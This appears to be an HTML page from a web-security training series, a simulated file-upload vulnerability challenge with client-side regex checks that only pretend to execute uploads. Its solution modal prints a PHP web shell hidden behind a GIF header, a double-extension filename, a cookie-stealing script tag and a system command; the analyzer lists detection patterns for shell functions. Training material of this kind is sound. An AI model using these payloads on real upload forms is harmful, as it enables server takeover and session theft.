<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>File Upload Vulnerability Challenge</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    :root {
      --primary: #4361ee;
      --secondary: #3f37c9;
      --accent: #4895ef;
      --dark: #2b2d42;
      --light: #f8f9fa;
      --success: #4cc9f0;
      --warning: #f8961e;
      --danger: #f72585;
      --gray: #6c757d;
      --dark-bg: #0f172a;
      --card-bg: #1e293b;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Poppins', sans-serif;
    }

    body {
      background: linear-gradient(135deg, var(--dark-bg), #1a2a42);
      color: var(--light);
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      padding: 30px 15px;
    }

    .intro {
      text-align: center;
      max-width: 800px;
      margin-bottom: 40px;
      animation: fadeInDown 0.8s ease;
    }

    .intro h1 {
      font-size: 3rem;
      font-weight: 700;
      background: linear-gradient(90deg, var(--danger), var(--warning));
      -webkit-background-clip: text;
      color: transparent;
      margin-bottom: 20px;
    }

    .intro p {
      font-size: 1.1rem;
      color: rgba(255, 255, 255, 0.75);
      line-height: 1.6;
    }

    .playground {
      background: var(--card-bg);
      padding: 2.5rem;
      border-radius: 16px;
      box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3);
      width: 100%;
      max-width: 800px;
      margin-bottom: 30px;
      animation: fadeInUp 0.8s ease;
    }

    .playground h2 {
      text-align: center;
      margin-bottom: 20px;
      font-size: 1.8rem;
    }

    .upload-area {
      border: 2px dashed var(--accent);
      border-radius: 10px;
      padding: 2rem;
      text-align: center;
      margin-bottom: 1.5rem;
      position: relative;
      transition: all 0.3s ease;
    }

    .upload-area.highlight {
      border-color: var(--success);
      background-color: rgba(76, 201, 240, 0.1);
    }

    .upload-area i {
      font-size: 3rem;
      color: var(--accent);
      margin-bottom: 1rem;
    }

    .upload-area input[type="file"] {
      position: absolute;
      width: 100%;
      height: 100%;
      top: 0;
      left: 0;
      opacity: 0;
      cursor: pointer;
    }

    button {
      width: 100%;
      padding: 1rem;
      border: none;
      border-radius: 10px;
      background: linear-gradient(135deg, var(--danger), var(--warning));
      color: white;
      font-weight: 600;
      font-size: 1rem;
      cursor: pointer;
      margin-top: 10px;
      transition: all 0.3s ease;
    }

    button:hover {
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(247, 37, 133, 0.3);
    }

    .actions {
      display: flex;
      gap: 20px;
      margin-top: 20px;
      justify-content: center;
    }

    .action-btn {
      padding: 0.7rem 1.2rem;
      background: #334155;
      border-radius: 10px;
      cursor: pointer;
      transition: all 0.3s ease;
      font-weight: 500;
      border: 1px solid var(--danger);
    }

    .action-btn:hover {
      background: var(--danger);
      color: white;
    }

    .result-container {
      margin-top: 30px;
      padding: 20px;
      background: #334155;
      border-radius: 10px;
      border: 1px solid var(--danger);
    }

    .result-container h3 {
      margin-bottom: 15px;
      color: var(--danger);
    }

    #uploadResult {
      min-height: 100px;
      padding: 15px;
      background: #1e293b;
      border-radius: 8px;
      font-family: monospace;
      white-space: pre-wrap;
    }

    .file-info {
      margin-top: 15px;
      padding: 10px;
      background: #2b3a4f;
      border-radius: 5px;
    }

    .navigation {
      display: flex;
      justify-content: space-between;
      width: 100%;
      max-width: 800px;
      margin-top: 20px;
    }

    .nav-btn {
      padding: 0.8rem 1.5rem;
      background: #334155;
      border-radius: 10px;
      cursor: pointer;
      transition: all 0.3s ease;
      font-weight: 500;
      border: 1px solid var(--accent);
      color: white;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .nav-btn:hover {
      background: var(--accent);
    }

    /* Modal */
    .modal {
      display: none;
      position: fixed;
      z-index: 10;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.6);
      justify-content: center;
      align-items: center;
    }

    .modal-content {
      background: var(--card-bg);
      padding: 2rem;
      border-radius: 12px;
      width: 90%;
      max-width: 500px;
      text-align: center;
      position: relative;
    }

    .close {
      position: absolute;
      top: 15px;
      right: 20px;
      font-size: 1.5rem;
      cursor: pointer;
      color: var(--gray);
    }

    @keyframes fadeInUp {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    @keyframes fadeInDown {
      from { opacity: 0; transform: translateY(-20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    code {
      background: #2b3a4f;
      padding: 2px 5px;
      border-radius: 3px;
      font-family: monospace;
    }

    .code-block {
      display: block;
      background: #2b3a4f;
      padding: 10px;
      border-radius: 5px;
      margin: 10px 0;
      text-align: left;
      overflow-x: auto;
    }
  </style>
</head>
<body>

  <div class="intro">
    <h1>File Upload Vulnerability Challenge</h1>
    <p>Test your skills against a vulnerable file upload system. Your goal is to upload a file that contains executable code that the server will run. The system checks both file extensions and content patterns.</p>
  </div>

  <div class="playground">
    <h2>Profile Picture Upload</h2>
    <form id="uploadForm">
      <div class="upload-area" id="uploadArea">
        <i class="fas fa-cloud-upload-alt"></i>
        <h3>Drag & Drop your file here</h3>
        <p>or click to browse (only images allowed)</p>
        <input type="file" id="fileInput" accept=".jpg,.png,.jpeg" />
      </div>
      <button type="submit">Upload File</button>
    </form>

    <div class="result-container">
      <h3>Upload Analysis:</h3>
      <div id="uploadResult">
        File details and analysis results will appear here...
      </div>
    </div>

    <div class="actions">
      <div class="action-btn" id="hintBtn">Hint</div>
      <div class="action-btn" id="solutionBtn">Solution</div>
    </div>
  </div>

  <div class="navigation">
    <button class="nav-btn" id="prevBtn">
      <i class="fas fa-arrow-left"></i> Previous Challenge
    </button>
    <button class="nav-btn" id="nextBtn">
      Next Challenge <i class="fas fa-arrow-right"></i>
    </button>
  </div>

  <!-- Modal -->
  <div class="modal" id="modal">
    <div class="modal-content">
      <span class="close" id="closeModal">&times;</span>
      <h3 id="modalTitle"></h3>
      <p id="modalText"></p>
    </div>
  </div>

  <script>
    // DOM Elements
    const hintBtn = document.getElementById('hintBtn');
    const solutionBtn = document.getElementById('solutionBtn');
    const modal = document.getElementById('modal');
    const modalTitle = document.getElementById('modalTitle');
    const modalText = document.getElementById('modalText');
    const closeModal = document.getElementById('closeModal');
    const uploadForm = document.getElementById('uploadForm');
    const fileInput = document.getElementById('fileInput');
    const uploadResult = document.getElementById('uploadResult');
    const uploadArea = document.getElementById('uploadArea');
    const prevBtn = document.getElementById('prevBtn');
    const nextBtn = document.getElementById('nextBtn');

    // Modal functionality
    function showModal(title, content, isHtml = false) {
        modalTitle.textContent = title;
        if (isHtml) {
            modalText.innerHTML = content;
        } else {
            modalText.textContent = content;
        }
        modal.style.display = 'flex';
    }

    // File analysis
    uploadForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        if (!fileInput.files.length) {
            uploadResult.textContent = "Please select a file first!";
            return;
        }

        const file = fileInput.files[0];
        const reader = new FileReader();

        reader.onload = function(e) {
            const fileContent = e.target.result;
            const fileName = file.name.toLowerCase();
            const fileSize = (file.size / 1024).toFixed(2) + ' KB';
            const fileType = file.type || 'Unknown';

            // Check for executable code
            const analysis = analyzeFile(fileContent, fileName);
            
            // Display results
            uploadResult.innerHTML = `
                <div class="file-info">
                    <strong>Filename:</strong> ${file.name}<br>
                    <strong>Type:</strong> ${fileType}<br>
                    <strong>Size:</strong> ${fileSize}
                </div>
                <div style="margin-top:15px">
                    ${analysis.isMalicious ? 
                        `<span style="color:var(--danger)">⚠️ ${analysis.reason}</span>` : 
                        `<span style="color:var(--success)">✓ File appears safe</span>`}
                </div>
            `;

            // Show execution results if malicious
            if (analysis.isMalicious) {
                setTimeout(() => {
                    uploadResult.innerHTML += `
                        <div style="margin-top:15px;color:var(--danger);border-top:1px solid var(--danger);padding-top:10px">
                            <strong>Code Execution Simulation:</strong><br>
                            ${simulateAttack(analysis.type, fileContent)}
                        </div>
                    `;
                    showSuccessMessage(!localStorage.getItem('upload_hint_seen'), 
                                      !localStorage.getItem('upload_solution_seen'));
                }, 1000);
            }
        };

        reader.readAsText(file);
    });

    function analyzeFile(content, filename) {
        const dangerousExtensions = ['.php','.phtml','.php3','.php4','.php5','.phar','.html','.htm','.js'];
        const fileExt = filename.slice(filename.lastIndexOf('.'));
        
        // Check for PHP code
        const phpPatterns = [
            /<\?php[\s\S]*?\?>/i, /<\?=[\s\S]*?\?>/i, /<\?[\s\S]*?\?>/i
        ];
        
        // Check for system commands - MORE SPECIFIC PATTERNS
        const systemPatterns = [
            /system\(['"][^'"]+['"]\)/i,    // system('command')
            /exec\(['"][^'"]+['"]\)/i,      // exec('command')
            /shell_exec\(['"][^'"]+['"]\)/i // shell_exec('command')
        ];

        // Check for JavaScript
        const jsPatterns = [
            /<script\b[^>]*>[\s\S]*?<\/script>/i,
            /javascript:/i,
            /eval\(.*\)/i
        ];

        // Check for image with embedded PHP
        const hasImageHeader = content.includes('GIF89a') || content.includes('\xFF\xD8\xFF');

        // Analysis results
        const result = {
            isMalicious: false,
            reason: "",
            type: ""
        };

        // 1. Check for PHP code (regardless of extension)
        if (phpPatterns.some(p => p.test(content))) {
            result.isMalicious = true;
            result.reason = "PHP code detected" + dangerousExtensions.includes(fileExt) ? "" : " in non-PHP file";
            result.type = "php";
            return result;
        }

        // 2. Check for system commands - ONLY if in PHP context
        if (phpPatterns.some(p => p.test(content)) && 
            systemPatterns.some(p => p.test(content))) {
            result.isMalicious = true;
            result.reason = "System commands detected in PHP code";
            result.type = "system";
            return result;
        }

        // 3. Check for JavaScript (only in HTML/JS files)
        if (['.html','.htm','.js'].includes(fileExt) && 
            jsPatterns.some(p => p.test(content))) {
            result.isMalicious = true;
            result.reason = "JavaScript code detected";
            result.type = "javascript";
            return result;
        }

        // 4. Check for image with embedded PHP
        if (hasImageHeader && phpPatterns.some(p => p.test(content))) {
            result.isMalicious = true;
            result.reason = "PHP code embedded in image";
            result.type = "php";
            return result;
        }

        // 5. Check dangerous extensions (only if no content patterns matched)
        if (dangerousExtensions.includes(fileExt)) {
            result.isMalicious = true;
            result.reason = "Dangerous file extension";
            result.type = "extension";
            return result;
        }

        return result;
    }

    function simulateAttack(type, content) {
        switch(type) {
            case "php":
                return "PHP code executed on server!\n" +
                       (content.includes('system(') ? "Commands executed with web server privileges" : 
                        "Arbitrary PHP code executed");
                        
            case "system":
                return "System commands executed!\n" +
                       "Server response: Command executed as www-data\n" +
                       extractCommand(content);
                       
            case "javascript":
                return "JavaScript executed in victim's browser!\n" +
                       "XSS successful - session cookies stolen";
                       
            case "extension":
                return "Dangerous file uploaded!\n" +
                       "Could execute if accessed directly";
                       
            default:
                return "Malicious code executed!";
        }
    }

    function extractCommand(content) {
        const cmdMatch = content.match(/system\(['"]([^'"]+)['"]\)/i) || 
                         content.match(/exec\(['"]([^'"]+)['"]\)/i);
        return cmdMatch ? `Command: ${cmdMatch[1]}` : "Unknown command executed";
    }

    function showSuccessMessage(noHintUsed, noSolutionUsed) {
        let points = 0;
        let message = "";
        
        if (noSolutionUsed && noHintUsed) {
            points = 10;
            message = "Perfect! You solved it without any hints! (10 points)";
        } else if (noSolutionUsed) {
            points = 5;
            message = "Good job! You used a hint but not the solution. (5 points)";
        } else {
            points = 0;
            message = "You viewed the solution. (0 points)";
        }
        
        showModal("Success! 🎯", `${message}\n\nVulnerability exploited: ${uploadResult.querySelector('span').textContent}`);
    }

    // Hint and Solution buttons
    hintBtn.addEventListener('click', () => {
        localStorage.setItem('upload_hint_seen', 'true');
        showModal(
            "Hint 🧩", 
            "Try these techniques:\n\n1. Upload a PHP file with image header (GIF89a; <?php)\n2. Use double extensions (image.jpg.php)\n3. HTML file with JavaScript\n4. File with system commands"
        );
    });

    solutionBtn.addEventListener('click', () => {
        localStorage.setItem('upload_solution_seen', 'true');
        showModal(
            "Solution 💡", 
            `<strong>PHP in image:</strong>
            <div class="code-block">GIF89a;
&lt;?php 
  system($_GET['cmd']); 
?&gt;</div>
            
            <strong>Double extension:</strong>
            <div class="code-block">profile.jpg.php</div>
            
            <strong>JavaScript in HTML:</strong>
            <div class="code-block">&lt;script&gt;
  fetch('/steal-cookie?='+document.cookie)
&lt;/script&gt;</div>
            
            <strong>System commands:</strong>
            <div class="code-block">&lt;?php 
  system('ls -la /'); 
?&gt;</div>`,
            true
        );
    });

    // Modal close handlers
    closeModal.addEventListener('click', () => {
        modal.style.display = 'none';
    });

    window.addEventListener('click', (event) => {
        if (event.target === modal) {
            modal.style.display = 'none';
        }
    });

    // Drag and drop functionality
    ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
        uploadArea.addEventListener(eventName, preventDefaults, false);
    });

    function preventDefaults(e) {
        e.preventDefault();
        e.stopPropagation();
    }

    ['dragenter', 'dragover'].forEach(eventName => {
        uploadArea.addEventListener(eventName, () => {
            uploadArea.classList.add('highlight');
        }, false);
    });

    ['dragleave', 'drop'].forEach(eventName => {
        uploadArea.addEventListener(eventName, () => {
            uploadArea.classList.remove('highlight');
        }, false);
    });

    uploadArea.addEventListener('drop', handleDrop, false);

    function handleDrop(e) {
        const dt = e.dataTransfer;
        const files = dt.files;
        fileInput.files = files;
        
        // Auto-trigger analysis
        const event = new Event('submit');
        uploadForm.dispatchEvent(event);
    }

    // Navigation buttons
    prevBtn.addEventListener('click', () => {
        window.location.href = 'ssrf.html';
    });

    nextBtn.addEventListener('click', () => {
        window.location.href = 'idor.html';
    });
</script>

</body>
</html>